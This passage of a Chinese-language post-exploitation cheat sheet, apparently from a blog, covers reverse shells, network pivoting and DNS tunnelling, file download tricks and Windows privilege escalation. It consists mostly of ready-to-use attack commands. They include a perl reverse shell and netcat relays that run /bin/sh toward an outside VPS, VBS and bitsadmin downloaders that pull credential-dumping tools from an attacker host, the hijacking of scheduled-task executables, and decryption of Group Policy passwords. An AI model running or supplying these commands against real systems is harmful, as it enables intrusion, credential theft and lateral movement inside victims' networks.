class="number">3389</span>);exec(&quot;C:\Windows\System32\<span class="built_in">cmd</span>.exe&quot;);&#x27;</span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>&quot;;$p=<span class="number">9999</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));<span class="keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">代理(有点鸡肋)</span><br><span class="line">vps：nc -lvp <span class="number">9999</span></span><br><span class="line">内网服务器：nc -lvp <span class="number">3333</span> -e /bin/sh</span><br><span class="line">边界服务器：nc -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> <span class="number">9999</span> -c &quot;nc -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>

<h2 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">参数：</span><br><span class="line">-C 压缩传输</span><br><span class="line">-f 将ssh转入后台，不占用当前shell</span><br><span class="line">-N 建立静默连接（建立了连接，但是看不见具体会话）</span><br><span class="line">-g 允许远程主机连接到本地由于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发（socks代理）</span><br><span class="line">-P 指定ssh端口</span><br><span class="line"></span><br><span class="line">需要配置ssh配置文件</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">AllowTcpForwarding yes     	是否允许转发tcp协议</span><br><span class="line">GatewayPorts yes   			是否允许远程登陆主机连接本地转发端口</span><br><span class="line">PermitRootLogin yes			是否允许root登陆</span><br><span class="line">PasswordAuthentication yes	是否允许使用基于密码的认证</span><br><span class="line">TCPKeepAlive yes			保持心跳，防止ssh断开</span><br><span class="line"></span><br><span class="line">service ssh restart  重启ssh服务</span><br><span class="line">/etc/init.d/ssh restart</span><br><span class="line"></span><br><span class="line">本地端口转发：  正向tcp转发</span><br><span class="line">ssh -L 本地端口:目标主机ip:目标端口 root@网络边界服务器ip</span><br><span class="line">例： ssh -CfNg -L <span class="number">2121</span>:<span class="number">10</span>.<span class="number">161</span>.<span class="number">81</span>.<span class="number">211</span>:<span class="number">3389</span> root@<span class="number">140</span>.<span class="number">121</span>.<span class="number">161</span>.<span class="number">205</span>  //在VPS上执行</span><br><span class="line"></span><br><span class="line">远程端口转发：  类似反向shell</span><br><span class="line">ssh -R vps端口:目标主机:目标主机端口 vps用户名和host</span><br><span class="line">例：ssh -R <span class="number">3306</span>:<span class="number">10</span>.<span class="number">161</span>.<span class="number">81</span>.<span class="number">211</span>:<span class="number">3389</span> root@<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>  //在网络边界服务器上执行</span><br><span class="line"></span><br><span class="line">动态转发</span><br><span class="line">ssh -D <span class="number">8080</span> user@host</span><br><span class="line">例：ssh -D <span class="number">8080</span> root@<span class="number">140</span>.<span class="number">121</span>.<span class="number">161</span>.<span class="number">205</span></span><br></pre></td></tr></table></figure>

<h2 id="应用层隧道-Http-Https"><a href="#应用层隧道-Http-Https" class="headerlink" title="应用层隧道 Http/Https"></a>应用层隧道 Http/Https</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reGeorg   http://github.com/sensepost/reGeorg</span><br><span class="line"></span><br><span class="line">python reGeorgSocksProxy.py -u http://test.com/tunnel.aspx -p <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">windows下可以使用sockscap64连接代理端口</span><br><span class="line"></span><br><span class="line">linux：</span><br><span class="line">proxyresolv www.google.com  查看proxychains是否可以成功代理访问google</span><br><span class="line">如果提示没有该程序：</span><br><span class="line">cp /usr/lib/proxychains3/proxyresolv /usr/bin/</span><br></pre></td></tr></table></figure>

<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Dnscat2</span><br><span class="line">① 部署域名解析</span><br><span class="line">A类解析   名称：ns1   值：<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span></span><br><span class="line">NS类解析  名称：vpn(可随意设置) 值：ns1.gabgm.xyz</span><br><span class="line">测试是否成功解析：</span><br><span class="line"><span class="built_in">ping</span>、nslookup、</span><br><span class="line">tcpdump -n -i ens0 udp dst port <span class="number">53</span> </span><br><span class="line"></span><br><span class="line">②安装dnscat2服务端</span><br><span class="line">linux版本：</span><br><span class="line">环境：</span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line"><span class="function">Dnscat2:</span></span><br><span class="line"><span class="function"><span class="title">git</span> <span class="title">clone</span> <span class="title">https</span>://<span class="title">github.com</span>/<span class="title">iagox86</span>/<span class="title">dnscat2.git</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">dnscat2</span>/<span class="title">server</span>/</span></span><br><span class="line"><span class="function"><span class="title">bundle</span> <span class="title">install</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">windows</span>版本：</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">downloads.skullsecurity.org</span>/<span class="title">dnscat2</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">③ 启动</span></span><br><span class="line"><span class="function">中继模式：速度慢，但是隐秘</span></span><br><span class="line"><span class="function"><span class="title">rudy</span> ./<span class="title">dnscat2.rb</span> <span class="title">vpn.gabgm.xyz</span> -<span class="title">e</span> <span class="title">open</span> -<span class="title">c</span> <span class="title">passwd</span> --<span class="title">no</span>-<span class="title">cache</span></span></span><br><span class="line"><span class="function">直连模式：速度快，但是明显</span></span><br><span class="line"><span class="function"><span class="title">ruby</span> ./<span class="title">dnscat2.rb</span> --<span class="title">dns</span> <span class="title">server</span>=127.0.0.1,<span class="title">port</span>=533,<span class="title">type</span>=<span class="title">TXT</span> --<span class="title">secret</span>=<span class="title">password</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-<span class="title">c</span> 定义“<span class="title">pre</span>-<span class="title">shared</span> <span class="title">sercet</span>” 使用具有预共享密钥的身份验证机制来防止中间人攻击，否则可能会被第三方还原。</span></span><br><span class="line"><span class="function">-<span class="title">e</span> 规定安全级别。<span class="title">open</span>表示服务端允许客户端不进行加密</span></span><br><span class="line"><span class="function">--<span class="title">no</span>-<span class="title">cache</span> 禁止缓存。必须开启，因为<span class="title">powershell</span>-<span class="title">dnscat2</span>客户端与<span class="title">dnscat2</span>服务端的<span class="title">caching</span>模式不兼容</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">④测试是否可以通信</span></span><br><span class="line"><span class="function"><span class="title">dnscat2</span>-<span class="title">v0</span>.07-<span class="title">client</span>-<span class="title">win32.exe</span> --<span class="title">ping</span> <span class="title">vpn.gabgm.xyz</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑤客户端连接</span></span><br><span class="line"><span class="function">中继模式：<span class="title">dnscat2</span>-<span class="title">v0</span>.07-<span class="title">client</span>-<span class="title">win32.exe</span> --<span class="title">dns</span> <span class="title">domain</span>=<span class="title">vpn.gabgm.xyz</span> --<span class="title">secret</span> <span class="title">password</span></span></span><br><span class="line"><span class="function">直连模式：<span class="title">dnscat2</span>-<span class="title">v0</span>.07-<span class="title">client</span>-<span class="title">win32.exe</span> --<span class="title">dns</span> <span class="title">server</span>=192.168.168.168,<span class="title">port</span>=553,<span class="title">type</span>=<span class="title">TXT</span> --<span class="title">secret</span>=<span class="title">password</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">服务端：命令与<span class="title">msf</span>类似</span></span><br><span class="line"><span class="function"><span class="title">sessions</span>  查看所有连接会话</span></span><br><span class="line"><span class="function"><span class="title">session</span> --<span class="title">i</span> 1  进入会话1</span></span><br><span class="line"><span class="function"><span class="title">shell</span> 进入<span class="title">shell</span>模式</span></span><br><span class="line"><span class="function"><span class="title">help</span> 查看可以执行哪些命令</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iodine</span><br><span class="line">官网：https://code.kryo.se/iodine/</span><br><span class="line">域名配置同Dnscat2</span><br><span class="line">安装：</span><br><span class="line">apt-get install iodine</span><br><span class="line"></span><br><span class="line">启动：</span><br><span class="line">iodine -f -c -P password <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span> vps.gabgm.com -DD</span><br><span class="line">参数：</span><br><span class="line">-f 前台运行</span><br><span class="line">-c 禁止检查所有传入请求客户端IP地址</span><br><span class="line">-P 指定密码</span><br><span class="line">-D 指定调试等级</span><br><span class="line"></span><br><span class="line">检查配置是否正常：</span><br><span class="line"><span class="function">https://<span class="title">code.kryo.se</span>/<span class="title">iodine</span>/<span class="title">check</span>-<span class="title">it</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用：</span></span><br><span class="line"><span class="function"><span class="title">Linux</span>：</span></span><br><span class="line"><span class="function"><span class="title">iodine</span> -<span class="title">f</span> -<span class="title">P</span> <span class="title">password</span> <span class="title">vps.gabgm.com</span> -<span class="title">M</span> 200</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">windows</span>:</span></span><br><span class="line"><span class="function"><span class="title">iodine</span> -<span class="title">f</span> -<span class="title">P</span> <span class="title">password</span> <span class="title">vps.gabgm.com</span></span></span><br><span class="line"><span class="function"><span class="title">windows</span>需要安装<span class="title">openvpn</span>(目的是增加一块虚拟网卡)</span></span><br></pre></td></tr></table></figure>

<h2 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">EW</span><br><span class="line">官网：http://rootkiter.com/EarthWorm/</span><br><span class="line">已停止更新</span><br><span class="line"></span><br><span class="line">正向socks v5服务器</span><br><span class="line">ew -s ssocksd -l <span class="number">1080</span></span><br><span class="line"></span><br><span class="line">反向socks v5服务器</span><br><span class="line">vps：ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span>   <span class="number">8888</span>端口接收发送内网数据，<span class="number">1080</span>端口接收发送用户数据</span><br><span class="line">目标机器：ew -s rssocks -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> -e <span class="number">8888</span>   连接vps端口</span><br><span class="line"></span><br><span class="line">多级级联（正向）   外网 - 网络边界 - 内网数据库服务器 - 内网 （相邻之间可以访问）</span><br><span class="line">内网数据库服务器：ew -s ssocksd -l <span class="number">999</span></span><br><span class="line">网络边界服务器：ew -s lcx_tran -l <span class="number">1010</span> -f 内网数据库服务器ip -g <span class="number">999</span></span><br><span class="line"></span><br><span class="line">多级级联（反向）  外网 - 网络边界 - 内网数据库服务器 - 内网 （相邻之间可以访问）</span><br><span class="line">vps：ew -s lcx_listen -l <span class="number">1080</span> -e <span class="number">888</span>    <span class="number">888</span>端口接收发送内网数据，<span class="number">1080</span>端口接收发送用户数据</span><br><span class="line">内网数据库服务器：ew -s ssocksd -l <span class="number">998</span></span><br><span class="line">网络边界服务器：ew -s lcx_slave -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> -e <span class="number">888</span> -f 内网数据库服务器ip -g <span class="number">998</span></span><br><span class="line"></span><br><span class="line">更多层网络（反向） 外网 - 网络边界 - 内网数据库服务器 - 内网服务器 - 内网核心层 （相邻之间可以访问）</span><br><span class="line">VPS：ew -s rcsocks -l <span class="number">1001</span> -e <span class="number">113</span></span><br><span class="line">网路边界服务器：ew -s lcx_slave -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> -e <span class="number">113</span> -f 内网数据库服务器ip -g <span class="number">123</span></span><br><span class="line">内网数据库服务器：ew -s lcx_listen -l <span class="number">123</span> -e <span class="number">133</span></span><br><span class="line">内网服务器：ew -s rssocks -d 内网数据库服务器ip -e <span class="number">133</span></span><br></pre></td></tr></table></figure>



<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Termite  </span><br><span class="line">官网：http://rootkiter.com/Termite/</span><br><span class="line">支持所有平台，windows、linux、mac</span><br><span class="line"></span><br><span class="line">一级目标机：agent.exe -l <span class="number">888</span></span><br><span class="line">vps：admin.exe -c 一级目标ip -l <span class="number">888</span></span><br><span class="line">二级目标机：agent.exe -c 一级目标ip -l <span class="number">888</span></span><br><span class="line"></span><br><span class="line">控制端命令：</span><br><span class="line">show 查看当前连接主机的连接拓扑情况</span><br><span class="line"><span class="keyword">goto</span> <span class="number">2</span>   进入二号主机</span><br><span class="line">connect 三级目标机ip <span class="number">888</span>  （当三级目标机开启监听后，在二号机会话中用该命令连接，三号机会连接在二号机中）</span><br><span class="line">listen <span class="number">999</span> 监听<span class="number">999</span>端口</span><br><span class="line">socks <span class="number">1080</span>  在被控端和vps上开启socks代理，端口都是<span class="number">1080</span></span><br><span class="line">shell <span class="number">444</span>  在本地<span class="number">444</span>端口开启一个反弹的shell。本地nc连接就可以，nc <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">444</span></span><br><span class="line">downfile test.txt <span class="number">1</span>.txt  下载目标主机的test.txt文件到本地<span class="number">1</span>.txt，文件需和工具在同一个目录下</span><br><span class="line">upfile <span class="number">1</span>.txt test.txt 将本地<span class="number">1</span>.txt文件上传到目标主机</span><br></pre></td></tr></table></figure>

<h1 id="压缩与解压缩命令"><a href="#压缩与解压缩命令" class="headerlink" title="压缩与解压缩命令"></a>压缩与解压缩命令</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">rar:</span></span><br><span class="line"><span class="function"><span class="title">rar</span> <span class="title">a</span> -<span class="title">k</span> -<span class="title">r</span> -<span class="title">s</span> -<span class="title">m3</span> <span class="title">c</span>:\<span class="title">test</span>\<span class="title">test.rar</span> <span class="title">c</span>:\<span class="title">test.txt</span>  压缩<span class="title">test.txt</span>文件</span></span><br><span class="line"><span class="function"><span class="title">rar</span> <span class="title">e</span> <span class="title">c</span>:\<span class="title">test.rar</span>  解压到当前文件夹</span></span><br><span class="line"><span class="function"><span class="title">rar</span> <span class="title">a</span> -<span class="title">n0</span> -<span class="title">r</span> -<span class="title">v20k</span> <span class="title">c</span>:\<span class="title">test.rar</span> <span class="title">c</span>:\<span class="title">test.txt</span>  分卷压缩<span class="title">test.txt</span>文件</span></span><br><span class="line"><span class="function"><span class="title">rar</span> <span class="title">x</span> <span class="title">c</span>:\<span class="title">test.part1.rar</span> <span class="title">c</span>:\ 分卷解压缩</span></span><br><span class="line"><span class="function"><span class="title">a</span> 添加要压缩的文件</span></span><br><span class="line"><span class="function"><span class="title">e</span> 解压到当前文件夹</span></span><br><span class="line"><span class="function"><span class="title">x</span> 解压到指定目录绝对</span></span><br><span class="line"><span class="function">-<span class="title">k</span> 锁定压缩文件</span></span><br><span class="line"><span class="function">-<span class="title">s</span> 生成存档文件（可以提高压缩比）</span></span><br><span class="line"><span class="function">-<span class="title">p</span> 指定压缩密码</span></span><br><span class="line"><span class="function">-<span class="title">r</span> 递归压缩</span></span><br><span class="line"><span class="function">-<span class="title">x</span> 指定要排除的文件</span></span><br><span class="line"><span class="function">-<span class="title">v</span> 分卷打包</span></span><br><span class="line"><span class="function">-<span class="title">ep</span> 从名称中排除路径</span></span><br><span class="line"><span class="function">-<span class="title">ep1</span> 从名称中排除基本目录</span></span><br><span class="line"><span class="function">-<span class="title">m1</span> 最快压缩</span></span><br><span class="line"><span class="function">-<span class="title">m2</span> 较快压缩</span></span><br><span class="line"><span class="function">-<span class="title">m3</span> 标准压缩</span></span><br><span class="line"><span class="function">-<span class="title">m4</span> 较慢压缩</span></span><br><span class="line"><span class="function">-<span class="title">m5</span> 最慢压缩，压缩比最高</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">7<span class="title">z</span></span></span><br><span class="line"><span class="function">7<span class="title">z</span> <span class="title">a</span> -<span class="title">r</span> -<span class="title">p123456</span> <span class="title">c</span>:\<span class="title">test</span>.7<span class="title">z</span> <span class="title">c</span>:\<span class="title">test.txt</span> 加密压缩<span class="title">test.txt</span>文件</span></span><br><span class="line"><span class="function">7<span class="title">z</span> <span class="title">x</span> -<span class="title">p123456</span> <span class="title">c</span>:\<span class="title">test</span>.7<span class="title">z</span> -<span class="title">oc</span>:\  解压加密压缩包</span></span><br><span class="line"><span class="function">7<span class="title">z</span> <span class="title">a</span> -<span class="title">r</span> -<span class="title">v20k</span> -<span class="title">p123456</span> <span class="title">c</span>:\<span class="title">test</span>.7<span class="title">z</span> <span class="title">c</span>:\<span class="title">test.txt</span>  分卷加密压缩<span class="title">test.txt</span>文件</span></span><br><span class="line"><span class="function">7<span class="title">z</span> <span class="title">x</span> -<span class="title">p123456</span> <span class="title">c</span>:\<span class="title">test</span>.7<span class="title">z</span>.001 -<span class="title">oc</span>:\   解压加密分卷压缩包</span></span><br><span class="line"><span class="function">-<span class="title">r</span> 递归压缩</span></span><br><span class="line"><span class="function">-<span class="title">o</span> 指定输出目录</span></span><br><span class="line"><span class="function">-<span class="title">p</span> 指定密码</span></span><br><span class="line"><span class="function">-<span class="title">v</span> 分卷压缩</span></span><br><span class="line"><span class="function"><span class="title">a</span> 添加压缩文件</span></span><br></pre></td></tr></table></figure>

<h1 id="文件的上传和下载"><a href="#文件的上传和下载" class="headerlink" title="文件的上传和下载"></a>文件的上传和下载</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">ftp:</span></span><br><span class="line"><span class="function"><span class="title">ftp</span> 192.168.168.168</span></span><br><span class="line"><span class="function">输入用户名和密码就连接成功</span></span><br><span class="line"><span class="function"><span class="title">type</span> 查看当前传输方式，默认是<span class="title">ascii</span>码模式（传输<span class="title">txt</span>等文件），<span class="title">binary</span>为二进制传输（传输<span class="title">exe</span>，图片，视频等）。</span></span><br><span class="line"><span class="function"><span class="title">lcd</span> 查看本地当前位置</span></span><br><span class="line"><span class="function"><span class="title">cd</span> 进入指定目录</span></span><br><span class="line"><span class="function"><span class="title">get</span> <span class="title">test.txt</span> 下载<span class="title">ftp</span>服务器上的<span class="title">test.txt</span>文件到本地当前位置</span></span><br><span class="line"><span class="function"><span class="title">put</span> <span class="title">test.txt</span> 1.<span class="title">txt</span> 上传<span class="title">test.txt</span>文件,并命名为1.<span class="title">txt</span>，1.<span class="title">txt</span>省略则表示不改文件名</span></span><br><span class="line"><span class="function"><span class="title">send</span> <span class="title">test.txt</span> 1.<span class="title">txt</span> 上传<span class="title">test.txt</span>文件,并命名为1.<span class="title">txt</span>，1.<span class="title">txt</span>省略则表示不改文件名</span></span><br><span class="line"><span class="function"><span class="title">mget</span> <span class="title">test.txt</span> <span class="title">test1.txt</span> 下载多个文件，</span></span><br><span class="line"><span class="function"><span class="title">mget</span> .<span class="title">txt</span> 下载<span class="title">ftp</span>当前目录所有<span class="title">mp3</span>文件，其支持空格和？作为通配符</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vbs上传</span><br><span class="line"><span class="built_in">echo</span> ^<span class="built_in">set</span> a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):<span class="built_in">set</span> w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.<span class="built_in">type</span>=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>^  &gt;&gt; downfile.vbs</span><br><span class="line"></span><br><span class="line">使用：cscript downfile.vbs http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/tv-dumper.exe tv-dumper.exe</span><br><span class="line"></span><br><span class="line">downfile.vbs内容为：</span><br><span class="line"><span class="built_in">set</span> a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):<span class="built_in">set</span> w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.<span class="built_in">type</span>=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  </span><br><span class="line"></span><br><span class="line">或将链接写在vbs文件中：</span><br><span class="line"><span class="built_in">Set</span> Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line"><span class="built_in">Set</span> Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;.&quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe&quot;,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="built_in">Set</span> aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.<span class="built_in">Mode</span> = <span class="number">3</span></span><br><span class="line">aGet.<span class="built_in">Type</span> = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\procdump.exe&quot;,<span class="number">2</span></span><br><span class="line"></span><br><span class="line">执行 cscript download.vbs</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bitsadmin</span><br><span class="line">windows xp以后的系统自带该工具</span><br><span class="line">bitsadmin /transfer n http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe c:\procdump.exe</span><br></pre></td></tr></table></figure>

<h1 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h1><p>提权有横向提权和纵向提权。</p>
<p>纵向提权是从低权限用户提权成高权限用户。如User权限提升至System权限</p>
<p>横向提权是通过A系统权限获得B系统权限</p>
<h2 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">查看当前用户权限：whoami /groups</span><br><span class="line">查看系统安全补丁：</span><br><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">windows-exploit-suggester  windows提权工具（需要安装xlrd1.<span class="number">2</span>.<span class="number">0</span>）pip install xlrd==<span class="number">1</span>.<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">AonCyberLabs</span>/<span class="title">Windows</span>-<span class="title">Exploit</span>-<span class="title">Suggester</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">更新数据：</span></span><br><span class="line"><span class="function"><span class="title">python</span> <span class="title">windows</span>-<span class="title">exploit</span>-<span class="title">suggetster.py</span> --<span class="title">update</span></span></span><br><span class="line"><span class="function">预处理：</span></span><br><span class="line"><span class="function"><span class="title">python</span> .\<span class="title">windows</span>-<span class="title">exploit</span>-<span class="title">suggester.py</span> -<span class="title">d</span> .\2022-03-13-<span class="title">mssb.xls</span> -<span class="title">i</span> .\1.<span class="title">txt</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Sherlock脚本</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">rasta</span>-<span class="title">mouse</span>/<span class="title">Sherlock</span></span></span><br><span class="line"><span class="function">导入脚本：</span></span><br><span class="line"><span class="function"><span class="title">import</span>-<span class="title">module</span> <span class="title">Sherlock.ps1</span></span></span><br><span class="line"><span class="function"><span class="title">Find</span>-<span class="title">AllVulns</span>  搜索所有未安装的补丁</span></span><br><span class="line"><span class="function"><span class="title">Find</span>-<span class="title">MS14058</span>  搜索是否安装<span class="title">MS14058</span>漏洞</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf</span><br><span class="line">post\windows\gather\enum_patches模块</span><br><span class="line"></span><br><span class="line">use post\windows\gather\enum_patches</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">查看系统运行的计划任务:</span><br><span class="line"><span class="function">cmd: <span class="title">schtasks</span> /<span class="title">query</span> /<span class="title">fo</span> <span class="title">list</span> /<span class="title">v</span></span></span><br><span class="line"><span class="function"><span class="title">powershell</span>: <span class="title">Get</span>-<span class="title">ScheduledTask</span></span></span><br><span class="line"><span class="function"><span class="title">powershell</span>:  <span class="title">Get</span>-<span class="title">ScheduledTask</span> | <span class="title">Select</span> * | ? &#123;($<span class="title">_.TaskPath</span> -<span class="title">notlike</span> &quot;\<span class="title">Microsoft</span>\<span class="title">Windows</span>\*&quot;) -<span class="title">And</span> ($<span class="title">_.Principal.UserId</span> -<span class="title">notlike</span> &quot;*$<span class="title">env:UserName</span>*&quot;)&#125; | <span class="title">Format</span>-<span class="title">Table</span> -<span class="title">Property</span> <span class="title">State</span>, <span class="title">Actions</span>, <span class="title">Date</span>, <span class="title">TaskPath</span>, <span class="title">TaskName</span>, @&#123;<span class="title">Name</span>=&quot;<span class="title">User</span>&quot;;<span class="title">Expression</span>=&#123;$<span class="title">_.Principal.userID</span>&#125;&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">accesschk.exeshi</span> 是微软官方提供的工具，可用于检测是否有可利用的缺陷漏洞</span></span><br><span class="line"><span class="function">第一次运行该工具，会弹出许可协议框。加参数可自动接受许可。</span></span><br><span class="line"><span class="function"><span class="title">accesschk.exe</span> /<span class="title">accepteula</span></span></span><br><span class="line"><span class="function">列出权限配置有缺陷的文件夹</span></span><br><span class="line"><span class="function"><span class="title">accesschk.exe</span> -<span class="title">uwdqs</span> &quot;用户名&quot; <span class="title">c</span>:\</span></span><br><span class="line"><span class="function">列出权限配置有缺陷的文件</span></span><br><span class="line"><span class="function"><span class="title">accesschk.exe</span> -<span class="title">uwdqs</span> &quot;用户名&quot; <span class="title">c</span>:\*.*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">根据任务计划，替换有权限设置缺陷的<span class="title">exe</span>文件，从而实现提权</span></span><br></pre></td></tr></table></figure>

<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>SYSVOL:</p>
<p>sysvol是活动目录的一个用于存储公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制</p>
<p>sysvol文件夹在安装活动目录时自动创建，主要用于存放登陆脚本、组策略数据以及其他域控需要的域信息</p>
<p>sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享</p>
<p>整个sysvol目录在所有域控中时自动同步和共享的，所有的组策略在</p>
<p>C:\Windows\SYSVOL\domain\Policies中</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">条件：管理员通过组策略统一修改过密码。</span><br><span class="line">统一修改密码方法：在域控上执行：win+R——》gpmc.msc   选择域名 -》 右键组策略对象 -》 新建  -》 右击新建的对象，点编辑 -》 计算机配置 -》 首选项  -》 控制面板设置 -》 本地用户和组  右键 -》 新建 -》 本地用户</span><br><span class="line"></span><br><span class="line">统一修改密码后的配置文件：</span><br><span class="line"><span class="function">c:\<span class="title">Windows</span>\<span class="title">SYSVOL</span>\<span class="title">domain</span>\<span class="title">Policies</span>\&#123;域<span class="title">ID</span>值&#125;\<span class="title">MACHINE</span>\<span class="title">Preferences</span>\<span class="title">Groups</span>\<span class="title">Groups.xml</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">cpassword</span>项就是用<span class="title">AES</span>-256加密密码后的密文，<span class="title">newName</span>或<span class="title">userName</span>（由什么功能的策略决定）就是用户名。</span></span><br><span class="line"><span class="function"><span class="title">cpassword</span>可以用工具破解。</span></span><br><span class="line"><span class="function"><span class="title">kali</span>：<span class="title">gpp</span>-<span class="title">decrypt</span> 加密后的密文</span></span><br><span class="line"><span class="function">在目标机器上直接执行：</span></span><br><span class="line"><span class="function"><span class="title">powershell</span>：<span class="title">Import</span>-<span class="title">Module</span> .\<span class="title">Get</span>-<span class="title">GPPPassword.ps1</span>;<span class="title">Get</span>-<span class="title">GPPPassword</span></span></span><br><span class="line"><span class="function"><span class="title">msf</span>: <span class="title">use</span> <span class="title">post</span>\<span class="title">windows</span>\<span class="title">gather</span>\<span class="title">credentials</span>\<span class="title">gpp</span></span></span><br><span class="line"><span class="function"><span class="title">empire</span>: <span class="title">usemodule</span> <span class="title">privesc</span>/<span class="title">gpp</span></span></span><br></pre></td></tr></table></figure>

